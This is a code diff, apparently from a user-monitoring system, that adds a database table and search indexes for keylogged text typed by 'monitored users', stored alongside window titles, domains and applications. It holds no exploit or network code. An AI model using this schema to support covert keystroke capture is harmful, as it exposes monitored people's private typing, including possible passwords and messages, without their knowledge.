@@ -381,6 +381,32 @@ def init_db():
             ''')
             print("✅ Tabela screen_frames criada")
 
+            # Tabela de keylog (texto digitado por usuário monitorado, para busca e alinhamento com timeline)
+            print("📋 Criando tabela keylog_entries...")
+            db.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS keylog_entries (
+                id SERIAL PRIMARY KEY,
+                usuario_monitorado_id INTEGER NOT NULL,
+                captured_at TIMESTAMP NOT NULL,
+                text_content TEXT NOT NULL,
+                window_title VARCHAR(500),
+                domain VARCHAR(255),
+                application VARCHAR(100),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (usuario_monitorado_id) REFERENCES usuarios_monitorados (id) ON DELETE CASCADE
+            );
+            ''')
+            db.cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylog_usuario ON keylog_entries(usuario_monitorado_id);')
+            db.cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylog_captured ON keylog_entries(captured_at DESC);')
+            db.cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylog_usuario_date ON keylog_entries(usuario_monitorado_id, (captured_at::date));')
+            try:
+                db.cursor.execute('''
+                CREATE INDEX IF NOT EXISTS idx_keylog_text_search ON keylog_entries USING gin(to_tsvector('portuguese', COALESCE(text_content, '')));
+                ''')
+            except Exception:
+                pass
+            print("✅ Tabela keylog_entries criada")
+
             # Tabela de tokens de API
             print("📋 Criando tabela de tokens de API...")
             db.cursor.execute('''
